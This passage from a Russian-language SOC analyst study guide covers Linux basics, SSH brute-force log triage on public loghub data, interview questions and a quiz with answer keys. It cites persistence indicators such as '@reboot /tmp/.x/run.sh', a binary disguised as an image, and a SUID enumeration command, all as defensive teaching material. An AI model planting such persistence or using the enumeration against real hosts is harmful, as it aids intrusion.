+<aside class="note"><div class="kicker">Важно</div><p>Про тактики. В актуальной версии ATT&amp;CK (v19.2, сверено 23.09.2026) прежней единой тактики <strong>Defense Evasion</strong> уже нет: вместо неё две — <strong>Stealth</strong> (TA0005) «прятаться, выглядеть нормально» и <strong>Defense Impairment</strong> (TA0112) «ломать защиту и логирование» <sup class="refs">[<a class="ref" href="#src-mitre-tactics">27</a>]</sup>. На собеседовании привычное «Defense Evasion» тебя не подставит (много лет так и называлось), но если зайдёт разговор про свежую версию — знай про разделение. Точную версию, в которой это переехало, при подготовке не сверял. И помни: <strong>на страницах ATT&amp;CK нет Event ID</strong> — это специфика Windows, к Linux-логам не относится.</p></aside>
+<h2 id="interview">Вопросы с собеседований (EN / DE)</h2>
+<p>Так это спрашивают на junior SOC в Германии. Сначала попробуй ответить сам, потом разверни.</p>
+<details class="answer"><summary>In one command, how would you find the top attacking IPs in an SSH log? / Wie findest du mit einem Befehl die aktivsten Angreifer-IPs in einem SSH-Log?</summary><p><code>grep "Failed password" auth.log | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn | head</code>. Разбери вслух: grep отбирает неудачные входы, <code>grep -oE</code> вытаскивает IP, <code>sort</code> ставит дубли рядом (обязательно перед uniq), <code>uniq -c</code> считает, <code>sort -rn</code> сортирует по убыванию числа. Это показывает, что ты думаешь конвейером, а не одной большой командой.</p></details>
+<details class="answer"><summary>What's the difference between kill and kill -9? / Was ist der Unterschied zwischen kill und kill -9?</summary><p><code>kill PID</code> шлёт SIGTERM (15) — вежливая просьба завершиться, процесс успевает прибраться. <code>kill -9 PID</code> шлёт SIGKILL (9) — ядро обрывает процесс немедленно, без уборки. SIGKILL применяют к зависшим. Добивка, которую любят: SIGKILL и SIGSTOP нельзя перехватить или проигнорировать <sup class="refs">[<a class="ref" href="#src-signal7">20</a>]</sup>. И для SOC: на боевом хосте убийство процесса — работа L2, не L1.</p></details>
+<details class="answer"><summary>You see a successful SSH login during a brute-force attack. Incident or not? / Erfolgreicher SSH-Login während eines Brute-Force-Angriffs — Vorfall oder nicht?</summary><p>«Зависит, и вот что я проверю». Были ли до <code>Accepted</code> неудачные попытки для этого пользователя с этого же IP (признак успешного подбора). Репутация IP. Входил ли пользователь раньше с этого адреса и в это время (baseline). Тип входа: password или publickey. Если подбора не видно, IP чистый и вход обычен для пользователя — это Benign True Positive, но подтверждаю у клиента. Именно так мы разобрали <code>fztu</code>. Этим ответом ты показываешь процесс, а не угадайку.</p></details>
+<details class="answer"><summary>Where do you look first on a possibly compromised Linux host? / Wo schaust du auf einem möglicherweise kompromittierten Linux-Host zuerst?</summary><p>Логи <code>/var/log</code> (auth.log/secure), процессы <code>ps aux</code> и нагрузка, автозапуск — <code>crontab -l</code>, <code>/etc/cron.d/</code>, systemd-сервисы, свежие файлы в <code>/tmp</code> и <code>/dev/shm</code>, <code>/etc/passwd</code> на лишних UID 0 и новых пользователей, <code>.bash_history</code> и <code>authorized_keys</code>. Тогда же скажи, что как L1 ты это <strong>читаешь</strong>, а изменения оставляешь L2.</p></details>
+<details class="answer"><summary>What does 'x' in /etc/passwd mean? Can normal users read /etc/shadow? / Was bedeutet 'x' in /etc/passwd? Können normale Benutzer /etc/shadow lesen?</summary><p><code>x</code> в поле пароля значит, что хэш не здесь, а в <code>/etc/shadow</code> <sup class="refs">[<a class="ref" href="#src-passwd5">11</a>]</sup>. <code>/etc/passwd</code> читаем всем, а <code>/etc/shadow</code> — только root, поэтому хэши и вынесли. Обычный пользователь <code>/etc/shadow</code> прочитать не может; если может — это неправильные права и находка для отчёта.</p></details>
+<details class="answer"><summary>Why is cron interesting for a SOC analyst? / Warum ist Cron für einen SOC-Analysten interessant?</summary><p>Это самый частый способ закрепления в Linux: задача переживает перезагрузку и запускается сама — Scheduled Task/Job: Cron, T1053.003 <sup class="refs">[<a class="ref" href="#src-t1053-003">22</a>]</sup>. Проверяю пользовательские crontab, <code>/etc/crontab</code>, <code>/etc/cron.d/</code>. Красные флаги — запуск из <code>/tmp</code>, обфускация, <code>@reboot</code> на скрытый скрипт. Назови и системный cron с полем пользователя — покажешь глубину.</p></details>
+<p>Три вопроса, которые прилетают junior именно в Германии:</p>
+<details class="answer"><summary>Schichtdienst: as an L1 you sit long quiet stretches, then a burst. How do you keep quality? / Wie hältst du im Schichtdienst die Qualität?</summary><p>Честно: монотонность реальна. Держат её процесс и дисциплина — runbook и чеклист под каждый тип алерта, чтобы уставший в 4 утра делал то же, что бодрый; аккуратная Schichtübergabe с открытыми тикетами; тихие окна на дообучение (то, ради чего ты и присматриваешься к сменной работе). Не геройствую в одиночку: сомнительное — на L2. Это показывает, что ты понимаешь, как устроена работа SOC, а не только команды.</p></details>
+<details class="answer"><summary>Quereinsteiger: no commercial experience — why you? / Quereinsteiger ohne Berufserfahrung — warum du?</summary><p>Без оправданий и без «я всё умею». Показать метод: разбираю сырые логи руками, знаю MITRE ATT&amp;CK, строю таймлайн, понимаю границу L1/L2, довожу практику на TryHackMe до отчётов. Фронтенд-прошлое — плюс: HTTP, JS, веб-логи мне не чужие, а веб-атаки часть работы. Плюс языки. Не «я всё знаю», а «я быстро учусь и вот доказательства».</p></details>
+<details class="answer"><summary>You get a suspicious email reported by a user. First steps? / Verdächtige E-Mail von einem Nutzer — erste Schritte?</summary><p>Не кликаю по ссылкам и не открываю вложения на рабочей машине. Смотрю заголовки (реальный отправитель, SPF/DKIM/DMARC, путь Received). Ссылки и вложения — только через песочницу или репутационные сервисы, домены и хэши обогащаю (VirusTotal, AbuseIPDB <sup class="refs">[<a class="ref" href="#src-abuseipdb">14</a>]</sup>). Проверяю, скольким ещё пришло. По вердикту — блок отправителя/домена и удаление у остальных силами тех, у кого есть права. Показываешь спокойный процесс и осторожность с уликами.</p></details>
+<details class="answer"><summary>Give me an example of a false positive and how you'd confirm it. / Nenne ein Beispiel für einen Fehlalarm (False Positive) und wie du ihn bestätigst.</summary><p>Бери готовый из этого модуля: алерт <code>sshd: POSSIBLE BREAK-IN ATTEMPT</code>. Звучит как взлом, а на деле означает лишь несовпадение прямого и обратного DNS у источника — обычный интернет-шум. Как подтверждаю, что это FP: смотрю соседние строки того же соединения (<code>grep "sshd\[PID\]"</code>), вижу <code>invalid user</code>, <code>Failed password</code>, <code>Connection closed [preauth]</code> — вход не состоялся, всё оборвалось до аутентификации. Проговори и общий принцип: FP закрываю не «на глаз», а показав в логе, почему события безобидны, — тогда это обоснованный вердикт, а не отписка.</p></details>
+<details class="answer"><summary>You're stuck on an alert and don't know what it means. What do you do? / Du kommst bei einem Alert nicht weiter — was tust du?</summary><p>Спокойно и по порядку, без угадайки и без стыда. Сначала выжимаю из самого алерта всё: что за правило сработало, какие поля, какой хост и пользователь. Читаю runbook по этому типу, если он есть. Гуглю сигнатуру/Event ID/технику по первоисточникам (вендор, MITRE), обогащаю индикаторы. Ставлю таймбокс — например 15–20 минут: если после этого всё ещё туман или пахнет реальным инцидентом, не сижу молча, а эскалирую на L2 с тем, что уже собрал. «Не знаю, поэтому собрал вот это и передаю» — нормальный и правильный ответ L1; замалчивать или закрывать наугад — нет.</p></details>
+<h2 id="selfcheck">Самопроверка</h2>
+<p>Ответь, не подглядывая. Проходной балл — 12 из 15.</p>
+<div class="quiz"><div class="kicker">Квиз</div><div class="q"><div class="qtext">Ты в <code>/home/anna/cases</code>. Какая команда вернёт тебя в <code>/home/anna</code>?</div><div class="opts"><button type="button" class="opt" data-ok="1"><code>cd ..</code></button><button type="button" class="opt" data-ok="0"><code>cd ~cases</code></button><button type="button" class="opt" data-ok="0"><code>cd /</code></button><button type="button" class="opt" data-ok="0"><code>cd .</code></button></div><div class="why" hidden><code>..</code> — на уровень вверх. <code>cd /</code> кинет в корень, <code>cd .</code> оставит на месте, <code>cd ~</code> уведёт в домашний.</div></div><div class="q"><div class="qtext">Чем <code>&gt;</code> отличается от <code>&gt;&gt;</code>?</div><div class="opts"><button type="button" class="opt" data-ok="0">ничем, синонимы</button><button type="button" class="opt" data-ok="1"><code>&gt;</code> перезаписывает файл, <code>&gt;&gt;</code> дописывает в конец</button><button type="button" class="opt" data-ok="0"><code>&gt;</code> дописывает, <code>&gt;&gt;</code> перезаписывает</button></div><div class="why" hidden>Одна лишняя стрелка превращает «дописать улику» в «стереть свои заметки». Смотри на стрелки перед Enter.</div></div><div class="q"><div class="qtext">Почему перед <code>uniq -c</code> почти всегда ставят <code>sort</code>?</div><div class="opts"><button type="button" class="opt" data-ok="0">для красоты вывода</button><button type="button" class="opt" data-ok="1"><code>uniq</code> схлопывает только соседние одинаковые строки</button><button type="button" class="opt" data-ok="0">иначе <code>uniq</code> удалит все строки</button></div><div class="why" hidden><code>uniq</code> смотрит только на соседей. Без <code>sort</code> одинаковые, но разбросанные строки посчитаются отдельно, и счётчики будут врать.</div></div><div class="q"><div class="qtext">В <code>ls -l</code> вывод начинается с <code>-rw-r--r--</code>. Кто может писать в файл?</div><div class="opts"><button type="button" class="opt" data-ok="1">только владелец</button><button type="button" class="opt" data-ok="0">владелец и группа</button><button type="button" class="opt" data-ok="0">все</button></div><div class="why" hidden>Три тройки: владелец <code>rw-</code>, группа <code>r--</code>, остальные <code>r--</code>. Право <code>w</code> есть только у первой.</div></div><div class="q"><div class="qtext">Что означает <code>x</code> в поле пароля в <code>/etc/passwd</code>?</div><div class="opts"><button type="button" class="opt" data-ok="0">пароль пустой</button><button type="button" class="opt" data-ok="0">вход запрещён</button><button type="button" class="opt" data-ok="1">хэш пароля лежит в <code>/etc/shadow</code></button></div><div class="why" hidden><code>/etc/passwd</code> читаем всем, поэтому хэши вынесли в <code>/etc/shadow</code>, доступный только root. <code>x</code> — указатель туда.</div></div><div class="q"><div class="qtext">Какой UID всегда у root?</div><div class="opts"><button type="button" class="opt" data-ok="1">0</button><button type="button" class="opt" data-ok="0">1</button><button type="button" class="opt" data-ok="0">1000</button></div><div class="why" hidden>У root ровно 0. Второй пользователь с UID 0 — классическая закладка, её ищут первым делом.</div></div><div class="q"><div class="qtext">Чем <code>su anna</code> отличается от <code>sudo команда</code>?</div><div class="opts"><button type="button" class="opt" data-ok="0">ничем</button><button type="button" class="opt" data-ok="1"><code>su</code> спрашивает пароль anna, <code>sudo</code> — твой</button><button type="button" class="opt" data-ok="0"><code>su</code> спрашивает твой пароль, <code>sudo</code> — root</button></div><div class="why" hidden><code>su</code> переключает на другого пользователя по <strong>его</strong> паролю; <code>sudo</code> выполняет одну команду от root по <strong>твоему</strong>. И следы в логе у них разные.</div></div><div class="q"><div class="qtext"><code>kill -9 PID</code> — это какой сигнал и в чём его особенность?</div><div class="opts"><button type="button" class="opt" data-ok="1">SIGKILL, его нельзя перехватить или проигнорировать</button><button type="button" class="opt" data-ok="0">SIGTERM, процесс успевает прибраться</button><button type="button" class="opt" data-ok="0">SIGHUP, перечитать конфиг</button></div><div class="why" hidden>SIGKILL (9) обрывает процесс немедленно через ядро, без уборки. Обычный <code>kill</code> — это SIGTERM (15), вежливое завершение.</div></div><div class="q"><div class="qtext">Строка cron <code>0 3 * * 1 backup.sh</code> запустится…</div><div class="opts"><button type="button" class="opt" data-ok="0">каждый день в 03:00</button><button type="button" class="opt" data-ok="1">по понедельникам в 03:00</button><button type="button" class="opt" data-ok="0">каждую минуту</button></div><div class="why" hidden>Поля: минута 0, час 3, день месяца любой, месяц любой, день недели 1 (понедельник).</div></div><div class="q"><div class="qtext">Чем <code>systemctl stop ssh</code> отличается от <code>systemctl disable ssh</code>?</div><div class="opts"><button type="button" class="opt" data-ok="1">stop останавливает сейчас, disable убирает из автозапуска</button><button type="button" class="opt" data-ok="0">это синонимы</button><button type="button" class="opt" data-ok="0">stop убирает из автозапуска, disable останавливает сейчас</button></div><div class="why" hidden><code>start</code>/<code>stop</code> — про «сейчас», <code>enable</code>/<code>disable</code> — про «после перезагрузки». Остановил, но не выключил — вернётся при ребуте.</div></div><div class="q"><div class="qtext">В каком файле на Ubuntu искать вход по SSH и sudo?</div><div class="opts"><button type="button" class="opt" data-ok="1"><code>/var/log/auth.log</code></button><button type="button" class="opt" data-ok="0"><code>/var/log/apache2/access.log</code></button><button type="button" class="opt" data-ok="0"><code>/etc/passwd</code></button></div><div class="why" hidden><code>auth.log</code> (на RHEL — <code>secure</code>). access.log — про веб-сервер, <code>/etc/passwd</code> — это список пользователей, а не журнал.</div></div><div class="q"><div class="qtext">В <code>/tmp</code> нашёлся <code>update.png</code>, а <code>file update.png</code> пишет <code>ELF 64-bit executable</code>. Что это?</div><div class="opts"><button type="button" class="opt" data-ok="0">битая картинка</button><button type="button" class="opt" data-ok="1">исполняемая программа под видом картинки</button><button type="button" class="opt" data-ok="0">это норма для /tmp</button></div><div class="why" hidden><code>file</code> смотрит на содержимое, а не на расширение. ELF в <code>/tmp</code> под именем картинки — красный флаг.</div></div><div class="q"><div class="qtext">Строка <code>@reboot /tmp/.x/run.sh</code> в crontab — это про что по MITRE?</div><div class="opts"><button type="button" class="opt" data-ok="1">Persistence (закрепление), T1053.003 Cron</button><button type="button" class="opt" data-ok="0">Initial Access</button><button type="button" class="opt" data-ok="0">Impact</button></div><div class="why" hidden>Запуск после каждой перезагрузки из скрытой папки в <code>/tmp</code> — это закрепление через cron, T1053.003 <sup class="refs">[<a class="ref" href="#src-t1053-003">22</a>]</sup>.</div></div><div class="q"><div class="qtext">Пустой <code>/var/log/auth.log</code> на сервере. Твой вывод?</div><div class="opts"><button type="button" class="opt" data-ok="0">логов нет, всё чисто</button><button type="button" class="opt" data-ok="1">проверить journald и ротацию, возможна и очистка следов</button></div><div class="why" hidden>Пусто ≠ чисто. Либо логи в journald, либо ротация, либо кто-то почистил (T1070). Все три надо проверить.</div></div><div class="q"><div class="qtext">Что из этого L1 на боевом хосте делать НЕ должен?</div><div class="opts"><button type="button" class="opt" data-ok="0">построить таймлайн</button><button type="button" class="opt" data-ok="0">обогатить IP</button><button type="button" class="opt" data-ok="1">убить процесс и удалить файл</button></div><div class="why" hidden>Изоляция, убийство процессов, удаление — работа L2/IR. L1 сортирует, подтверждает и эскалирует, чтобы не испортить улики.</div></div></div>
+<h2 id="practice">Практика на реальных логах</h2>
+<p>Всё на настоящих данных из loghub <sup class="refs">[<a class="ref" href="#src-loghub">1</a>]</sup>: <code>OpenSSH_2k.log</code> (2000 строк) и <code>Linux_2k.log</code> (2000 строк). Скачай их к себе и работай в Терминале мака — команды портируемые, отличия BSD отмечены.</p>
+<pre><code>mkdir -p ~/thm/linux &amp;&amp; cd ~/thm/linux
+curl -O https://raw.githubusercontent.com/logpai/loghub/master/OpenSSH/OpenSSH_2k.log
+curl -O https://raw.githubusercontent.com/logpai/loghub/master/Linux/Linux_2k.log
+</code></pre>
+<p>Если <code>curl</code> упрётся, скачай оба файла через браузер со страницы loghub и положи в <code>~/thm/linux</code>. Проверка: <code>wc -l *.log</code> (покажет по 1999 — про ловушку последней строки помнишь из главы 1).</p>
+<h3>Задание 1. Разведка по SSH-логу (Part 1)</h3>
+<p>Ответь командами, числа сверь с ключом:</p>
+<ol>
+<li>Сколько всего строк <code>Failed password</code>?</li>
+<li>Сколько раз ломились именно в <code>root</code>?</li>
+<li>Сколько было успешных входов (<code>Accepted</code>)?</li>
+<li>Топ-3 атакующих IP по числу неудач.</li>
+</ol>
+<details class="answer"><summary>Ключ к заданию 1</summary><pre><code>grep -c &quot;Failed password&quot; OpenSSH_2k.log            # 520
+grep -c &quot;Failed password for root&quot; OpenSSH_2k.log   # 370
+grep -c &quot;Accepted&quot; OpenSSH_2k.log                   # 1
+grep &quot;Failed password&quot; OpenSSH_2k.log | grep -oE &quot;from [0-9.]+&quot; | sort | uniq -c | sort -rn | head -3
+#   286 from 183.62.140.253
+#    80 from 187.141.143.180
+#    46 from 103.99.0.122
+</code></pre>
+<p>Один успешный вход на 520 неудач — это тот самый <code>fztu</code>, которого мы разбирали.</p></details>
+<h3>Задание 2. Профиль главного атакующего</h3>
+<p>По <code>183.62.140.253</code>: сколько всего строк он оставил, сколько из них <code>Failed password</code>, в какое время шла его активность (первая и последняя неудача)? Прикинь темп: попыток в минуту.</p>
+<details class="answer"><summary>Ключ к заданию 2</summary><pre><code>grep -c &quot;183.62.140.253&quot; OpenSSH_2k.log                         # 867
+grep &quot;Failed password&quot; OpenSSH_2k.log | grep -c &quot;183.62.140.253&quot; # 286
+grep &quot;Failed password.*183.62.140.253&quot; OpenSSH_2k.log | head -1 | cut -c1-15  # Dec 10 10:54:29
+grep &quot;Failed password.*183.62.140.253&quot; OpenSSH_2k.log | tail -1 | cut -c1-15  # Dec 10 11:04:43
+</code></pre>
+<p>286 неудач примерно за 10 минут — это около 28 попыток в минуту, машинный темп. Человек так не печатает. Вот тебе и обоснование «brute force» в отчёте цифрами, а не на глаз. (867 строк против 286 «Failed» — потому что на каждую попытку приходится ещё и <code>pam_unix</code>, <code>Received disconnect</code> и прочие строки того же соединения.)</p></details>
+<h3>Задание 3. Второй лог, те же приёмы (перенос навыка)</h3>
+<p>Открой <code>Linux_2k.log</code> — это syslog другой машины, формат иной, но приёмы те же. Найди: сколько всего строк <code>authentication failure</code> и какой <code>rhost</code> встречается в них чаще всего.</p>
+<details class="answer"><summary>Ключ к заданию 3</summary><pre><code>grep -c &quot;authentication failure&quot; Linux_2k.log   # 490
+grep &quot;authentication failure&quot; Linux_2k.log | grep -oE &quot;rhost=[^ ]+&quot; | sort | uniq -c | sort -rn | head -3
+#    80 rhost=150.183.249.110
+#    23 rhost=n219076184117.netvigator.com
+#    23 rhost=207.243.167.114
+</code></pre>
+<p>Смысл задания — увидеть, что <code>grep | grep -oE | sort | uniq -c | sort -rn</code> работает на <strong>любом</strong> логе. Меняется только поле, которое вытаскиваешь: <code>from IP</code> в OpenSSH, <code>rhost=</code> здесь.</p></details>
+<h3>Задание 4. Очередь триажа</h3>
+<p>Три алерта в очереди. По каждому — вердикт (<strong>TP</strong> / <strong>FP</strong> / <strong>надо копать</strong>), одно предложение обоснования и приоритет (низкий / средний / высокий). Реши сам, потом сверь.</p>
+<p><strong>Алерт A.</strong> <code>sshd: reverse mapping … failed - POSSIBLE BREAK-IN ATTEMPT!</code> от одиночного IP, следом <code>Invalid user</code>, <code>Failed password</code>, <code>Connection closed [preauth]</code>.</p>
+<p><strong>Алерт B.</strong> <code>183.62.140.253</code> — 286 <code>Failed password</code> за 10 минут, входа нет.</p>
+<p><strong>Алерт C.</strong> <code>Accepted password for fztu from 119.137.62.142</code> в разгар перебора; у <code>fztu</code> ноль неудачных попыток, его IP в атаке не участвует.</p>
+<details class="answer"><summary>Ключ к заданию 4</summary><p><strong>A — FP, низкий.</strong> «POSSIBLE BREAK-IN» здесь про несовпадение прямого/обратного DNS, а не про взлом. Соединение закрыто на <code>[preauth]</code>, входа нет. Шум, уже покрытый алертом про brute force. Закрыть с пометкой.</p>
+<p><strong>B — TP (по факту brute force), средний.</strong> Перебор подтверждён цифрами (машинный темп ~28/мин), но результата нет: успешного входа с этого IP не было. Настоящее событие, но не пробитие. Рекомендации: заблокировать IP, отключить внешний вход по паролю, поставить fail2ban.</p>
+<p><strong>C — надо копать, средний→высокий до выяснения.</strong> Признаков успешного брута нет, но по одному куску лога «легитимно» не поставить: нет baseline. Обогатить IP, поднять историю входов <code>fztu</code> в SIEM, спросить клиента. Дальше — Benign TP или эскалация.</p>
+<p>Так выглядит смена: три алерта, два закрываются за минуты, один требует обогащения. Умение быстро отсекать A и B, не утонув в них, и есть работа L1.</p></details>
+<h3>Задание 5. Отчёт по-немецки</h3>
+<p>Оформи <strong>Алерт B</strong> как короткую запись в тикет. Схема: <strong>Was → Wann → Woher → Auswirkung → Empfehlung</strong>. Держись фактов из лога.</p>
+<details class="answer"><summary>Пример отчёта (Алерт B)</summary><p><strong>Was:</strong> SSH-Brute-Force-Angriff auf Host <code>LabSZ</code>, Ziel v. a. Benutzer <code>root</code>.
+<strong>Wann:</strong> ca. 10:54–11:04 Serverzeit (Zeitzone unbestätigt, syslog ohne TZ), ~286 fehlgeschlagene Anmeldungen in ~10 Minuten (~28/min, maschinelles Tempo).
+<strong>Woher:</strong> Quell-IP <code>183.62.140.253</code> (Haupttäter); insgesamt 23 beteiligte IPs, 520 <code>Failed password</code> im Log.
+<strong>Auswirkung:</strong> Kein erfolgreicher Login von dieser IP feststellbar — kein bestätigter Zugriff. Ein einzelner erfolgreicher Login (<code>fztu</code>) ist NICHT mit dem Angriff verbunden und wird separat geprüft.
+<strong>Empfehlung:</strong> Quell-IPs blockieren; SSH-Passwort-Login extern deaktivieren, nur Key-Auth; direkten root-Login verbieten (<code>PermitRootLogin no</code>); fail2ban einrichten. Bei Bestätigung von <code>fztu</code> durch den Kunden: Ticket schließen, sonst Eskalation an L2.</p>
+<p>Почему так: год и зону syslog не выдумываешь, а помечаешь как неподтверждённые; чётко разделяешь «атака была» и «доступа не было» — самая частая ошибка новичка склеить их в «нас взломали».</p></details>
+<details class="deep"><summary><span class="kicker">Копнуть глубже</span> Задание со звёздочкой: одноразовый отчёт скриптом</summary><p>Собери мини-отчёт одной командой — пригодится в главе про bash-скрипты дальше по пути:</p>
+<pre><code>{ echo &quot;== SSH triage $(date +%F) ==&quot;
+  echo &quot;Failed total : $(grep -c 'Failed password' OpenSSH_2k.log)&quot;
+  echo &quot;Root targeted: $(grep -c 'Failed password for root' OpenSSH_2k.log)&quot;
+  echo &quot;Accepted     : $(grep -c 'Accepted' OpenSSH_2k.log)&quot;
+  echo &quot;Top attackers:&quot;
+  grep 'Failed password' OpenSSH_2k.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn | head -3
+} &gt; ssh_triage_report.txt
+cat ssh_triage_report.txt
+</code></pre>
+<p>Одна <code>{ … } &gt; файл</code> собирает весь вывод в отчёт. То, что ты делал руками, — теперь воспроизводимо и прикладывается к тикету.</p></details>
+<h2 id="cheatsheet">Шпаргалка на один экран</h2>
+<p><strong>Где я и что вокруг</strong></p>
+<pre><code>pwd                 где я           ls -la      всё, включая скрытое
+cd папка / .. / ~   перейти/вверх/домой        cd -   в прошлый каталог
+cat / less / head -20 / tail -20    смотреть файл
+wc -l файл          сколько строк   file файл   что это НА САМОМ деле
+</code></pre>
+<p><strong>Поиск</strong></p>
+<pre><code>find . -name &quot;*.log&quot;        файлы по имени (на маке путь обязателен)
+find / -perm -4000 2&gt;/dev/null   SUID-файлы
+grep &quot;текст&quot; файл           строки        grep -c   счётчик
+grep -i / -v / -n / -o / -E  регистр / кроме / номера / только совпадение / шаблоны
+grep -rn &quot;IP&quot; /etc          рекурсивно по каталогу
+</code></pre>
+<p><strong>Операторы и пайп</strong></p>
+<pre><code>&amp;   фон      &amp;&amp;  и-если-успех      &gt; перезапись   &gt;&gt; дописать
+|   вывод одной команды на вход другой
+grep &quot;Failed password&quot; log | grep -oE &quot;from [0-9.]+&quot; | sort | uniq -c | sort -rn | head
+</code></pre>
+<p><strong>Права и пользователи</strong></p>
+<pre><code>ls -l    -rwxr-xr--  тип+владелец+группа+остальные   (r=4 w=2 x=1)
+chmod 640 файл       su имя (его пароль)   sudo cmd (твой пароль)
+/etc/passwd  логин:x:UID:GID:...:home:shell   (root=UID 0, x→/etc/shadow)
+awk -F: '$3==0' /etc/passwd   ищем второго root
+</code></pre>
+<p><strong>Процессы и службы</strong></p>
+<pre><code>ps aux | grep X     top / htop       kill PID (SIGTERM 15)   kill -9 PID (SIGKILL 9)
+ps aux --sort=-%cpu | head           jobs / fg / bg / Ctrl+Z
+systemctl status|start|stop ssh      enable/disable = автозапуск при загрузке
+</code></pre>
+<p><strong>Cron (закрепление №1)</strong></p>
+<pre><code>crontab -l / -e          min hour dom mon dow  команда
+0 3 * * 1 backup.sh       понедельник 03:00     @reboot / @daily / @hourly
+Смотреть: crontab -l у всех, /etc/crontab, /etc/cron.d/
+</code></pre>
+<p><strong>Пакеты и логи</strong></p>
+<pre><code>apt update / install / remove / list --installed
+/var/log/auth.log (Ubuntu) | /var/log/secure (RHEL) | apache2/access.log
+journalctl -u ssh --since &quot;1 hour ago&quot;     zgrep &quot;...&quot; auth.log.2.gz
+</code></pre>
+<p><strong>Куда смотреть на подозрительном хосте:</strong> <code>/var/log</code> → <code>ps aux</code> → <code>crontab -l</code> + <code>/etc/cron.d/</code> → <code>/tmp</code> и <code>/dev/shm</code> → <code>/etc/passwd</code> (UID 0, новые юзеры) → <code>.bash_history</code> + <code>authorized_keys</code>. <strong>Читаешь, не меняешь.</strong></p>
+<p><strong>Граница L1:</strong> триаж, таймлайн, обогащение, эскалация — да. Убивать процессы, удалять файлы, изолировать хост — нет (это L2/IR).</p>
+<h2 id="feedback">Обратная связь</h2>
+<p>Три вопроса, ответь одним сообщением — учту в следующих учебниках:</p>
+<ol>
+<li><strong>Темп и дозы.</strong> Где было слишком много нового за раз, а где, наоборот, разжёвано лишнее?</li>
+<li><strong>Сюжет и интерактив.</strong> Сквозная история про brute force и блоки триажа помогали держаться или отвлекали?</li>
+<li><strong>Что доработать.</strong> Чего не хватило именно для собеседования на junior SOC в Германии — больше немецкого, больше разбора логов, ещё вопросов?</li>
+</ol>
+<p>Дальше по плану: проходишь три комнаты Part 1–3 с этим учебником под рукой, потом можно <code>разбор:</code> по любой из них или <code>экзамен: Linux Fundamentals</code>, когда закроешь модуль.</p>
+<h2 id="sources">Источники</h2>
+<ol class="sources"><li id="src-loghub"><a href="https://github.com/logpai/loghub">loghub (LogPAI) — наборы реальных логов: OpenSSH_2k.log, Linux_2k.log; Zhu et al., ISSRE 2023</a><span class="checked"> — проверено 23.09.2026 (файлы скачаны, числа посчитаны скриптом)</span></li><li id="src-thm-lf1"><a href="https://tryhackme.com/room/linuxfundamentalspart1">TryHackMe — Linux Fundamentals Part 1 (структура заданий сверена по публичному разбору electronicsreference.com)</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-man-bash"><a href="https://man7.org/linux/man-pages/man1/bash.1.html">bash(1) — списки команд (&amp;, &amp;&amp;, ||, ;), перенаправления, пайпы, job control</a><span class="checked"> — проверено справочная ссылка</span></li><li id="src-t1070"><a href="https://attack.mitre.org/techniques/T1070/">ATT&amp;CK T1070 Indicator Removal (в v19 — тактика Stealth; T1070.003 Clear Command History)</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-explainshell"><a href="https://explainshell.com/">explainshell.com — разбирает любую команду по man-страницам</a><span class="checked"> — проверено справочная ссылка</span></li><li id="src-bsd-find"><a href="https://man.freebsd.org/cgi/man.cgi?query=find">find(1), FreeBSD — BSD-версия (на macOS такая же логика: путь обязателен)</a><span class="checked"> — проверено справочная ссылка</span></li><li id="src-man-find"><a href="https://man7.org/linux/man-pages/man1/find.1.html">find(1), GNU — man7.org</a><span class="checked"> — проверено справочная ссылка</span></li><li id="src-thm-lf2"><a href="https://tryhackme.com/room/linuxfundamentalspart2">TryHackMe — Linux Fundamentals Part 2 (структура заданий сверена по публичному разбору)</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-t1098-004"><a href="https://attack.mitre.org/techniques/T1098/004/">ATT&amp;CK T1098.004 Account Manipulation: SSH Authorized Keys</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-man-chmod"><a href="https://man7.org/linux/man-pages/man1/chmod.1.html">chmod(1) — man7.org</a><span class="checked"> — проверено справочная ссылка</span></li><li id="src-passwd5"><a href="https://man7.org/linux/man-pages/man5/passwd.5.html">passwd(5) — формат /etc/passwd, man7.org</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-t1136-001"><a href="https://attack.mitre.org/techniques/T1136/001/">ATT&amp;CK T1136.001 Create Account: Local Account</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-crypt5"><a href="https://manpages.debian.org/bookworm/libcrypt-dev/crypt.5.en.html">crypt(5) — форматы хэшей ($y$ yescrypt, $6$ sha512crypt), Debian manpages</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-abuseipdb"><a href="https://www.abuseipdb.com/">AbuseIPDB — репутация IP-адресов (обогащение индикатора)</a><span class="checked"> — проверено справочная ссылка</span></li><li id="src-fhs"><a href="https://refspecs.linuxfoundation.org/FHS_3.0/fhs-3.0.html">Filesystem Hierarchy Standard 3.0 (Linux Foundation)</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-thm-lf3"><a href="https://tryhackme.com/room/linuxfundamentalspart3">TryHackMe — Linux Fundamentals Part 3 (структура заданий сверена по публичному разбору)</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-pyhttp"><a href="https://docs.python.org/3/library/http.server.html">Python docs — http.server (порт 8000 по умолчанию, не для продакшена, --bind)</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-t1105"><a href="https://attack.mitre.org/techniques/T1105/">ATT&amp;CK T1105 Ingress Tool Transfer</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-t1496-001"><a href="https://attack.mitre.org/techniques/T1496/001/">ATT&amp;CK T1496.001 Resource Hijacking: Compute Hijacking</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-signal7"><a href="https://man7.org/linux/man-pages/man7/signal.7.html">signal(7) — номера сигналов, SIGKILL/SIGSTOP нельзя перехватить, man7.org</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-crontab5"><a href="https://man7.org/linux/man-pages/man5/crontab.5.html">crontab(5) — поля расписания, @reboot, системный crontab с полем пользователя, man7.org</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-t1053-003"><a href="https://attack.mitre.org/techniques/T1053/003/">ATT&amp;CK T1053.003 Scheduled Task/Job: Cron</a><span class="checked"> — проверено 23.09.2026</span></li><li id="src-apt-key"><a href="https://manpages.debian.org/bookworm/apt/apt-key.8.en.html">apt-key(8) — объявлен устаревшим, замена: /etc/apt/keyrings и Signed-By</a><span class="checked"> — проверено 